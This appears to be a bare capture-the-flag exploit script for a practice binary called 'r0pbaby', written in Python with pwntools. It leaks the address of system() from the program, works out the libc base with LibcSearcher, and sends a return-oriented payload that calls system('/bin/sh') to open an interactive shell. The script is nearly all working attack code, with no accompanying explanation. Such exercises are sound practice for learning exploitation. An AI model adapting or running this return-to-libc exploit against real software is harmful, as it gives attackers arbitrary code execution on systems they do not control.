exp：

```python
#!/usr/local/bin/python3

from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'debug'

sh = gdb.debug('./r0pbaby', "b *___libc_start_main")
# sh = process('./r0pbaby')

def GetSystemFunc():
    sh.sendlineafter(": ", "2")
    sh.sendlineafter(": ", "system")
    sh.recvuntil(":")
    ret = int(sh.recvline(), 16)
    print("GetLibcAddr:0x%x" %ret)
    return ret

system_addr = GetSystemFunc()
print("system_addr: 0x%x" %system_addr)
libc = LibcSearcher('system', system_addr)
libcbase = system_addr - libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
print("binsh_addr: 0x%x" %binsh_addr)

pop_rdi = 0x0000000000021112 + libcbase

payload = flat([
    p64(0xdeadbeef), 
    p64(pop_rdi),
    p64(binsh_addr),
    p64(system_addr), 
    ])
    
sh.sendlineafter(b'4) Exit\n:', b"3")
sh.sendlineafter(b"(max 1024):", str(len(payload)).encode('utf-8'))
sh.sendline(payload)

sh.interactive()
```
